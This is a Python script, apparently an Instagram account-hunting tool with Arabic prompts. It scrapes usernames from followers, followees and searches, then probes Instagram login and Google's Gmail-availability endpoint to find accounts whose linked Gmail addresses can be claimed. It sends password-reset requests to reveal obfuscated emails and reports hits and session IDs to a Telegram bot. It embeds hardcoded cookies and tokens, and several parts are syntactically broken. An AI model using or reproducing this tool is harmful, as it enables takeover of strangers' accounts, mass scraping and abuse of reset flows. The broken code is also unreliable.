import os
try:
	import user_agent
	import re
	import OneClick
	import socket
	from datetime import date
	from os import system
	from uuid import uuid4
	import json
	from OneClick import *
	import os
#	import time
	import requests
	import user_agent
	import datetime
	import webbrowser
	import pyfiglet
	import threading
	import signal
except:
#    os.system('pip install requests')
#    os.system('pip install user_agent')
#    os.system('pip install datetime')
#    os.system('pip install webbrowser')
#    os.system('pip install pyfiglet')
#    os.system('pip install threading')
#    os.system('pip install signal')
    os.system('cls' if os.name == 'nt' else 'clear')
#time.sleep(1)
print('Done.')
from os import system
import instaloader
import requests
import os
import sys
from user_agent import generate_user_agent
import datetime
import random
import requests
from colorama import Fore, Back
import time
import sys as n
import time as mm
import secrets
from user_agent import generate_user_agent
print('')
print('')
os.system('clear')
B = '[1;30m'
R = '[1;31m'
G = '[1;32m'
Y = '[1;33m'
Bl = '[1;34m'
P = '[1;35m'
C = '[1;36m'
W = '[1;37m'
print(C + '')
Z = '[1;31m'
X = '[1;33m'
Z1 = '[2;31m'
F = '[2;32m'
A = '[2;34m'
Y = '[1;34m'
M = '[1;37m'
U = '[1;37m'
X = '[1;33m'
Y = '[1;34m'
M = '[1;37m'
S = '[1;33m'
R = '[1;31m'
F = '[2;32m'
C = '[1;97m'
B = '[2;36m'
Y = '[1;34m'
C1 = '[2;35m'
a = 0
z = 0
b = 0
j = 0
m = 0
k = 0
t = 0
x = 0
g = 0
L = 0
h = 0
f = 0
qw = 0
E = 0
os.system('clear')

def u():
	global a, qw, L, j, E
	print('[1;36mTele https:@FG_on')
	took = input('\x1b[1;37m     تـــوكــن  :')
	if took == '':
	   system('clear')
	   print('Tok False')
	   exit()
	try:
		idddd = int(input('\x1b[2;32m  ايـــدي : '))
	except:
	   print('ID False')
	   exit()
	try:
		hani = open('username.txt', 'r').read().splitlines()
	except:
	   system('clear')
	   print('ملف السته غير موجود قم بسحب السته اولاً ')
	   exit()
	for hi in hani:
	       if '_' in str(hi):
	       	url = 'https://b.i.instagram.com/api/v1/accounts/login/'
	       	H = hi
	       	if '@gmail.com' in H:
	       		HN = H.split('@')[0]
	       		headers = {
	       		'Host': 'i.instagram.com',
	       		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	       		'X-IG-Connection-Type': 'WIFI',
	       		'X-IG-Capabilities': '3brTvw==',
	       		'Accept-Language': 'en-US',
	       		'Accept-Encoding': 'gzip, deflate',
	       		'Cookie': 'missing',
	       		'Accept': '*/*',
	       		'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)' }
	       		uid = str(uuid4())
	       		data = {
	       		'login_attempt_countn': '0',
	       		'_csrftoken': 'missing',
	       		'from_reg': 'false',
	       		'device_id': uid,
	       		'username': '{}'.format(H),
	       		'password': 'ffffdddddaaa666',
	       		'uuid': uid }
	       		re = requests.post(url, headers=headers, data=data).text
	       		if '"The username you entered ' in re:
	       			os.system('cls' if os.name == 'net' else 'clear')
	       			a += 1
	       			print(f'''\x1b[1;32m* Gmail : {L}\n\x1b[1;33m* Bad : {a}\n* Bad Mail : {qw}\n\x1b[1;36m* Error Username : {H}\n\x1b[1;32m* Codeing : ❖ @FG_on ❖\n''')
	       		if '"bad_password"' in re:
	       			url3 = 'https://android.clients.google.com/setup/checkavail'
	       			headers = {
	       			'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',
	       			'Connection': 'Keep-Alive',
	       			'Host': 'android.clients.google.com',
	       			'Content-Type': 'text/plain; charset=UTF-8',
	       			'Content-Length': '98' }
	       			data = json.dumps({
	       			'lastName': 'AbuJahl',
	       			'firstName': 'AbaLahb',
	       			'version': '3',
	       			'username': H })
	       			try:
	       				res = requests.post(url3, headers=headers, data=data)
	       			except:
	       				system('clear')
	       				print('intrinet Error * حدث خطأ في الاتصال')
	       				exit()
	       			if res.json()['status'] == 'USERNAME_UNAVAILABLE':
	       				os.system('cls' if os.name == 'net' else 'clear')
	       				qw += 1
	       				print(f'''\x1b[1;32m* Gmail : {L}\n\x1b[1;33m* Bad : {a}\n* Bad Mail : {qw}\n\x1b[1;36m* Error Username : {H}\n\x1b[1;32m* Codeing : ❖ @FG_on ❖\n''')
	       				os.system('cls' if res.json()['status'] == 'SUCCESS' or os.name == 'net' else 'clear')
	       				L += 1
	       				print(f'''\x1b[1;32m* Gmail : {L}\n\x1b[1;33m* Bad : {a}\n* Bad Mail : {qw}\n\x1b[1;36m* Error Username : {H}\n\x1b[1;32m* Codeing : ❖ @FG_on ❖\n''')
	       				G1 = HN
	       				iip = G1
	       				url22 = f'''https://i.instagram.com/api/v1/users/web_profile_info/?username={iip}'''
	       				head1 = {
	       				'x-ig-www-claim': '0',
	       				'x-ig-app-id': '936619743392459',
	       				'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
	       				'x-asbd-id': '198387',
	       				'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
	       				'sec-fetch-site': 'same-site',
	       				'sec-fetch-mode': 'cors',
	       				'sec-fetch-dest': 'empty',
	       				'sec-ch-ua-platform': '"Windows"',
	       				'sec-ch-ua-mobile': '?0',
	       				'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
	       				'referer': 'https://www.instagram.com/',
	       				'origin': 'https://www.instagram.com',
	       				'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 ,54664153777,1693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6,546641 53777,1693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
	       				'accept-language': 'ar',
	       				'accept-encoding': 'gzip, deflate, br',
	       				'accept': '*/*' }
	       				re = requests.get(url22, headers=head1).json()
	       				try:
	       					io = re['data']['user']['biography']
	       					fol = re['data']['user']['edge_followed_by']['count']
	       					fos = re['data']['user']['edge_follow']['count']
	       					id = re['data']['user']['id']
	       					nam = re['data']['user']['full_name']
	       					isp = re['data']['user']['is_private']
	       					op = re['data']['user']['edge_owner_to_timeline_media']['count']
	       					rm = requests.get(f'''https://o7aa.pythonanywhere.com/?id={id}''').json()
	       					dat = rm['date']
	       					j += 1
	       					Hunter = Hunter
	       					hd = str(Hunter.Services())
	       					hd5 = {
	       					'X-IG-Capabilities': 'AQ==',
	       					'X-IG-Connection-Type': 'WIFI',
	       					'Accept-Language': 'en-US',
	       					'User-Agent': hd,
	       					'Connection': 'Keep-Alive',
	       					'Host': 'i.instagram.com',
	       					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' }
	       					d5 = {
	       					'user_id': id,
	       					'ig_sig_key_version': '4' }
	       					u5 = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
	       					r6 = requests.post(u5, headers=hd5,data=d5).json()
	       					f7 = r6['obfuscated_email']
	       					tlg = f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=\n\t𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n❖ - 𝖍𝖎𝖙 : {j}\n❖ - 𝖓𝖆𝖒𝖊 : {nam}\n❖ - 𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : {iip}\n❖️ - 𝖊𝖒𝖆𝖎𝖑 : {iip}@gmail.com\n❖️ - 𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 : {fol}\n❖ - 𝖋𝖔𝖑𝖑𝖔𝖎𝖓𝖌 : {fos}\n❖ - 𝖕𝖔𝖘𝖙𝖘 : {op}\n❖ - 𝖉𝖆𝖙𝖆 𝖆𝖈𝖈𝖔𝖚𝖓𝖙 : {dat}\n❖ - 𝖗𝖊𝖘𝖙 :  {f7}\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n❖ - ᗷY : @H_6_N , @K_Q_A'''
	       					ru = requests.post(tlg)
	       				except:
	       					try:
	       						os.system('cls' if os.name == 'net' else 'clear')
	       						E += 1
	       						print(f'''\x1b[1;32m* Gmail : {L}\n\x1b[1;33m* Bad : {a}\n* Bad Mail : {qw}\n\x1b[1;36m* Error Username : {H}\n\x1b[1;32m* Codeing : ❖ @H_6_N ❖\n''')
	       						tlg = f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=\n\t𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n❖ - 𝖍𝖎𝖙 : {j}\n❖ - 𝖓𝖆𝖒𝖊 : {nam}\n❖ - 𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : {iip}\n❖️ - 𝖊𝖒𝖆𝖎𝖑 : {iip}@gmail.com\n❖️ - 𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 : {fol}\n❖ - 𝖋𝖔𝖑𝖑𝖔𝖎𝖓𝖌 : {fos}\n❖ - 𝖕𝖔𝖘𝖙𝖘 : {op}\n❖ - 𝖉𝖆𝖙𝖆 𝖆𝖈𝖈𝖔𝖚𝖓𝖙 : {dat}\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n❖ - ᗷY : @H_6_N , @K_Q_A'''
	       						ru = requests.post(tlg)
	       						with open('hani.gmail.txt', 'a') as hani:
	       							hani.write(f'''{iip}@gmail.com\n''')	       			 
	       					except:
	       						print('\n┏━━━━━━━━(حط السيزن ايدي)━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	       						print('')
	       						print('')
	       						cookies = sid = input('  SEASOON ID :')
	       						system('clear')

def hani8():
	print('\x1b[1;33m ســحــب الــســتــه مـن الـي يـتـابـعهـم [1]\n  ســـحــب الــســتــه مــن الــمــتـابـــعــين [2]\n ')
	try:
	   HH = int(input(' \x1b[1;36m  : اختار رقم للاستمرار [❖]  '))
	   system('clear')
	except:
	   print('Int Please')
	if HH == 1:
	   wwhani()
	if HH == 2:
	   wwhani1()
	   


def wwhani1():
	global a
	os.system('clear')
	Loki = instaloader.Instaloader()
	username = input('\x1b[1;33mحـط يـوزر الـحـسـاب الـوهـمـي  :')
	os.system('clear')
	password = input('\x1b[1;33mحــط بــاسـورد الـحساب الـوهـمـي :')
	os.system('clear')
	Saw = input('\x1b[1;33mحـط يـوزر تــسـحـب مـنـه الـسـتـه :')
	os.system('clear')
	os.system('rm -rf user.txt')
	print('\x1b[1;33m جـــاري ســــحــب الــســتـه ...')
	Loki.login(username, password)
	os.system('clear')
	profile = instaloader.Profile.from_username(Loki.context, Saw)
	follow_list = []
	count = 0
	print('')
	for Fin in profile.get_followers():
	   follow_list.append(Fin.username + '@gmail.com')
	   file = open('username.txt', 'a+')
	   file.write(follow_list[count])
	   file.write('')
	   file.close()
	   print(follow_list[count])
	   count = count + 1
	   a += 1
	   print(f'''\x1b[1;33m«--» - [{a}]''')


def wwhani():
	global a
	os.system('clear')
	Loki = instaloader.Instaloader()
	username = input('\x1b[1;33mحـط يـوزر الـحـسـاب الـوهـمـي  :')
	os.system('clear')
	password = input('\x1b[1;33mحــط بــاسـورد الـحساب الـوهـمـي :')
	os.system('clear')
	Saw = input('\x1b[1;33mحـط يـوزر تــسـحـب مـنـه الـسـتـه :')
	os.system('clear')
	os.system('rm -rf user.txt')
	print('\x1b[1;33m جـــاري ســــحــب الــســتـه ...')
	Loki.login(username, password)
	os.system('clear')
	profile = instaloader.Profile
	from_username(Loki.context, Saw)
	follow_list = []
	count = 0
	print('')
	for Fin in profile.get_followees():
	   follow_list.append(Fin.username + '@gmail.com')
	   file = open('username.txt', 'a+')
	   file.write(follow_list[count])
	   file.write('')
	   file.close()
	   print(follow_list[count])
	   count = count + 1
	   a += 1
	   print(f'''\x1b[1;33m«--» - [{a}]''')


def hani9():
	print('\x1b[1;33m ســحــب الــســتــه مـن الـي يـتـابـعهـم [1]\n  ســـحــب الــســتــه مــن الــمــتـابـــعــين [2]\n ')
	try:
	   HHH = int(input(' \x1b[1;36m  : اختار رقم للاستمرار [❖]  '))
	   system('clear')
	except:
	  print('Int Please')
	  exit()
	if HHH == 1:
	  han1()
	if HHH == 2:
		han2()


def han1():
	user = input(f'''{U}  {B}: حـط يـوزر لـسـحـب لــــســـتـــه{B}  {X}''')
	try:
	       head = {
	       'user-agent': generate_user_agent(),
	       'upgrade-insecure-requests': '1',
	       'sec-fetch-site': 'snone',
	       'sec-fetch-mode': 'navigate',
	       'sec-fetch-dest': 'document',
	       'sec-ch-ua-mobile': '?1',
	       'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	       'referer': 'https://www.instagram.com/{}/'.format(user),
	       'cookie': f'''mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}''',
	       'accept-language': 'en-US,en;q=0.9',
	       'accept-encoding': 'gzip, deflate, br',
	       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' }
	       rr1 = requests.get(f'''https://www.instagram.com/{user}/?__a=1&__d=dis''', headers=head).json()
	except:
		print(f'''{B}سيزن ايدي غير صالح''')
		exit()
	try:
	   idig = str(rr1['graphql']['user']['id'])
	   fol = str(rr1['graphql']['user']['edge_follow']['count'])
	except:
		print(f''' {B} يـوزر غـيـر صـحيح  ''')
		exit()
	x = int(fol)
	os.system('clear')
	headers = {
	'x-requested-with': 'XMLHttpRequest',
    'x-instagram-ajax': '1006236387',
    'x-ig-www-claim': 'hmac.AR2qNkJ-Qsp2zOYzhSBPzf4Qf-2cnEVZifYuZPmL7EqJRM5u',
    'x-ig-app-id': '936619743392459',
    'x-csrftoken': 'ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2',
    'x-asbd-id': '198387',
    'viewport-width': '797',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'sec-ch-prefers-color-scheme': 'light',
    'referer': f'''https://www.instagram.com/{user}/''',
    'cookie': f'''mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}''',
    'accept-language': 'en-US,en;q=0.9',
    'accept-encoding': 'gzip, deflate, br',
    'accept': '*/*' }
	hani11 = 0
	hani22 = 0
	response = requests.get('https://www.instagram.com/graphql/query/?query_hash=d04b0a864b4b54837c0d870b0e77e076&variables={"id":"' + str(idig) + '","include_reel":true,"fetch_mutual":false,"first":50}', headers=headers)
	if str('"has_next_page":false,') in response.text:
	       	try:
	       		reg = json.loads(response.text)['data']['user']['edge_follow']['edges']
	       		if reg == []:
	       			print('الـيـوز خـاص  عليك بختيار يوزر عام✔️ .')
	       			exit()
	       		for iu in reg:
	       			hani11 += 1
	       			os.system('cls' if os.name == 'nt' else 'clear')
	       			print(X + '❖' + X + 'Done : User' + C + ' «--» ' + B + ' ⋘ ' + X + f''' {hani11} ''' + B + ' ⋙ ' + str(iu['node']['username']))
	       			print('')
	       			print(X + '\n❖Codeing : ❖ ' + F + ' @FG_on❖ ')
	       			print('')
	       			open('username.txt', 'a').write(str(iu['node']['username']) + '@gmail.com')
	       			print('')
	       			print(X + '«--»' + F + ' تم سحب لسته ✔️ ' + X + '')
	       			print('')
	       	except:
	       		print(X + '«--»' + F + ' تم سحب لسته ✔️ ' + X + '')
	       		print('')
        	if hani22 != 0:
        		try:
        			end = re.findall(',"end_cursor":"(.*)"},"edges":', response.text)
        			response = requests.get('https://www.instagram.com/graphql/query/?query_hash=d04b0a864b4b54837c0d870b0e77e076&variables={"id":"' + str(idig) + '","include_reel":true,"fetch_mutual":false,"first":50,"after":"' + end[0] + '"}',headers =headers)
        			try:
        				reg = json.loads(response.text)['data']['user']['edge_follow']['edges']
        			except:
        				print('سيزن ايدي غير صالح')
        				exit()
        			for iu in reg:
        				hani11 += 1
        				os.system('cls' if os.name == 'nt' else 'clear')
        				print(X + '❖' + X + 'Done : User' + C + ' «--» ' + B + ' ⋘ ' + X + f''' {hani11} ''' + B + ' ⋙ ' + str(iu['node']['username']))
        				print('')
        				print(X + '\n❖Codeing : ❖ ' + F + ' @FG_on❖ ')
        				print('')
        				open('username.txt', 'a').write(str(iu['node']['username']) + '@gmail.com')
        				KeyboardInterrupt
        				print(X + '«--»' + F + ' تم سحب لسته✔️  ' + X + '')
        				print('')
        				try:
        					reg = json.loads(response.text)['data']['user']['edge_follow']['edges']
        					for iu in reg:
        						hani11 += 1
        						os.system('cls' if os.name == 'nt' else 'clear')
        						print(X + '❖' + X + 'Done : User' + C + ' «--» ' + B + ' ⋘ ' + X + f''' {hani11} ''' + B + ' ⋙ ' + str(iu['node']['username']))
        						print('')
        						print(X + '\n❖Codeing : ❖ ' + F + ' @FG_on❖ ')
        						print('')
        						open('username.txt', 'a').write(str(iu['node']['username']) + '@gmail.com')
        				except:
        					print(X + '«--»' + F + ' تم سحب لسته✔️  ' + X + '')
        					print('')
        					hani22 += 1
        		except:
        			1
        			
def han2():
	1
	global cookies
	target = input(f'''{U}  {B}: حـط يـوزر لـسـحـب لــــســـتـــه{B}  {X}''')
	os.system('clear')
	url22 = f'''https://www.instagram.com/{target}/?__a=1&__d=dis'''
	head1 = {
    'user-agent': generate_user_agent(),
    'upgrade-insecure-requests': '1',
    'sec-fetch-site': 'snone',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-dest': 'document',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
    'referer': 'https://www.instagram.com/{}/'.format(target),
    'cookie': f'''mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}''',
    'accept-language': 'en-US,en;q=0.9',
    'accept-encoding': 'gzip, deflate, br',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' }
	try:
	   rr = requests.get(url22, headers =head1).json()
	except:
	   	print('سيزن ايدي غير صالح')
	   	exit()
	idtel = str(rr['graphql']['user']['id'])
	headers = {
    'TE': 'Trailers',
    'Referer': 'https://www.instagram.com/' + str(target) + '/followers/',
    'Connection': 'keep-alive',
    'X-Requested-With': 'XMLHttpRequest',
    'X-IG-App-ID': '936619743392459',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept': '*/*',
    'User-Agent': Hunter.Services(),
    'Host': 'www.instagram.com' }
	cookies = {
    'sessionid': cookies }
	hani11 = 0
	hani22 = 0
	response = requests.get('https://www.instagram.com/graphql/query/?query_hash=c76146de99bb02f6415203be841dd25a&variables={"id":"' + idtel + '","include_reel":true,"fetch_mutual":true,"first":50}', headers =headers, cookies=cookies)
	if str('"has_next_page":false,') in response.text:
	       	try:
	       		reg = json.loads(response.text)['data']['user']['edge_followed_by']['edges']
	       		for iu in reg:
	       			hani11 += 1
	       			os.system('cls' if os.name == 'nt' else 'clear')
        		print(X + '❖' + X + 'Done : User' + C + ' «--» ' + B + ' ⋘ ' + X + f''' {hani11} ''' + B + ' ⋙ ' + str(iu['node']['username']))
        		print('')
        		print(X + '\n❖Codeing : ❖ ' + F + ' @FG_on ❖ ')
        		print('')
        		open('username.txt', 'a').write(str(iu['node']['username']) + '@gmail.com')
        		print('')
        		print(X + '«--»' + F + ' تم سحب لسته ✔️ ' + X + '')
        		print('')
	       	except:
	       		print(X + '«--»' + F + ' تم سحب لسته ✔️ ' + X + '')
	       		print('')
	       	if hani22 != 0:
	       		try:
	       			end = re.findall(',"end_cursor":"(.*)"},"edges":', response.text)
	       			response = requests.get('https://www.instagram.com/graphql/query/?query_hash=c76146de99bb02f6415203be841dd25a&variables={"id":"' + idtel + '","include_reel":true,"fetch_mutual":true,"first":50,"after":"' + end[0] + '"}', headers =headers, cookies=cookies)
	       			try:
	       				reg = json.loads(response.text)['data']['user']['edge_followed_by']['edges']
	       			except:
	       				print('سيزن ايدي غير صالح')
	       				exit()
        			for iu in reg:
        				hani11 += 1
        				os.system('cls' if os.name == 'nt' else 'clear')
        				print(X + '❖' + X + 'Done : User' + C + ' «--» ' + B + ' ⋘ ' + X + f''' {hani11} ''' + B + ' ⋙ ' +str(iu['node']['username']))
        				print('')
        				print(X + '\n❖Codeing : ❖ ' + F + ' H_6_N ❖ ')
        				print('')
        				open('username.txt', 'a').write(str(iu['node']['username']) + '@gmail.com')
        				KeyboardInterrupt
        				print(X + '«--»' + F + ' تم سحب لسته✔️  ' + X + '')
        				print('')
        				try:
        					reg = json.loads(response.text)['data']['user']['edge_followed_by']['edges']
        					for iu in reg:
        						hani11 += 1
        						os.system('cls' if os.name == 'nt' else 'clear')
        						print(X + '❖' + X + 'Done : User' + C + ' «--» ' + B + ' ⋘ ' + X + f''' {hani11} ''' + B + ' ⋙ ' +
        						str(iu['node']['username']))
        						print('')
        						print(X + '\n❖Codeing : ❖ ' + F + ' @FG_on❖ ')
        						print('')
        						open('username.txt', 'a').write(str(iu['node']['username']) + '@gmail.com')
        				except:
        					print(X + '«--»' + F + ' تم سحب لسته✔️  ' + X + '')
        					print('')
        					hani22 += 1
        				a = 0
        				v = 0
        				ok = '4567'
        				bb = 'qwertyuioplkjhgfdsazxcvbnm'
        		except:
        			1
def HANI():
	global a
	head = {
    'Cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid=' + sid }
	user = '1234567890qwertyuiopasdfghjklzxcvbnm.'
	for i in range(500):
		num = '56789'
		rng = str(''.join(random.choice(num) for i in range(int(1))))
		name = str(''.join(random.choice(user) for i in range(int(rng))))
		hani = requests.get(f'''https://www.instagram.com/web/search/topsearch/?context=blended&query={name}''', headers =head).json()
		hhan = 0
		try:
		   	hhan += 1
		   	email = user = str(hani['users'][hhan]['user']['username'])
		   	a += 1
		   	print(f'''\x1b[1;33m[{a}]«--» : [{email}] ''')
		   	user = email + '@gmail.com'
		   	with open('username.txt', 'a') as HACKED:
		   		HACKED.write(f'''{user}\n''')
		except:
		   print(Z + 'STOP Event Error ')
	    
	    
    



def O():
    try:
    	os.remove('username.txt')
    	os.remove('cookies.txt')
    except:
    	system('clear')
    	print('تــــم الـــحـــذف بــنــجــاح✔️')
    	exit()






def ha():
	token = input('\x1b[2;32m     تـــوكــن  :')
	print(' ')
	ID = int(input('\x1b[2;32m  ايـــدي : '))
	os.system('clear')
	USER = input(f'''{U}  {B}حط اسم المستخدم:''')
	print(' ')
	PASS = input(f'''{U}  {B}حط البـاسورد: ''')
	os.system('clear')
	url = 'https://www.instagram.com/accounts/login/ajax/'
	headers = {
    'x-requested-with': 'XMLHttpRequest',
    'x-instagram-ajax': '56f3c2d2a823',
    'x-ig-www-claim': '0',
    'x-ig-app-id': '936619743392459',
    'x-csrftoken': 'Lk9Lfwj0Hp0T3zCBYwjoeGBUBjU1sVXC',
    'x-asbd-id': '437806',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
    'referer': 'https://www.instagram.com/accounts/login/',
    'origin': 'https://www.instagram.com',
    'cookie': 'csrftoken=Lk9Lfwj0Hp0T3zCBYwjoeGBUBjU1sVXC; mid=YSuaiwAEAAEzvEB8maY7IzJ6MDzJ; ig_did=07753880-8B96-4C09-93E9-BA39B801DD08',
    'content-type': 'application/x-www-form-urlencoded',
    'content-length': '385',
    'accept-language': 'en-US,en;q=0.9',
    'accept-encoding': 'gzip, deflate, br',
    'accept': '*/*' }
	data = {
    'optIntoOneTap': 'false',
    'queryParams': '{}',
    'enc_password': f'''#PWD_INSTAGRAM_BROWSER:0:1613414957:{PASS}''',
    'username': f'''{USER}''' }
	req_login = requests.post(url, headers =headers,data =data)
	if '"authenticated":false' in req_login.text:
	   	print(Fore.RED + '[?]الباسورد خطا او ان الحساب سكيور  ')
	   	exit(0)
	elif '"authenticated":true' in req_login.text:
	   	sess = req_login.cookies['sessionid']
	   	time.sleep(1)
	   	global sid
	   	sid=sess
	   	tlg = f'''\n {sess}\n\n\n [BY] @FG_on - https://t.me/kkf1kk '
	   	print('تم ارسال السيزن لبوتك بنجاح✔️')
	   	requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
	   	print(f'''\n{B}Welcome to the hunting tool available in Gmail\n{Z}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n{X}┃   {M}❖ @ K_Q_A {Z}         ➠         {M}@ H_6_N{X}\n{F}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛   ''')
	   	print(' ➘  ')
	   	print('\x1b[1;33m ســــحـــــب الــــســــتــه عــشــــوائــــيـــه [1]\n  سحـب الـسـتـه بستخدام حساب وهمي [2]\n  سـحب الــسـتـه بسـتـخدام سيزن ايدي [3]\n فــــحــــــص الـــســـــتـــه جـــــيــــمـــيــل [4]\nســـــحــــــب ســــــــــيـــــــزن ايـــــــــــدي [5]\nحـــذف الــــســــتــه الــــمــــفـــحــــوصــه [0]')
	   	try:
	   		print('')
	   		HA = int(input(' \x1b[1;36m  : اختار رقم للاستمرار [❖]  '))
	   		system('clear')
	   	except:
	   		system('clear')
	   		print('Error - لا يجوز اختيار احرف')
	   		exit()
	   	if HA == 1:
	   		HANI()
	   	elif HA == 2:
	   		hani8()
	   	elif HA == 3:
	   		hani9()
	   	elif HA == 4:
	   		u()
	   	elif HA == 0:
	   		O()
	   	elif HA == 5:
	   		ha()
	   	else:
	   		system('clear')
	   		print('Error - اختيار خطأ')
	   		exit()



ha()


  
#Decoded By Hso : @sis_f  On Bot : @sis_ff_bot 

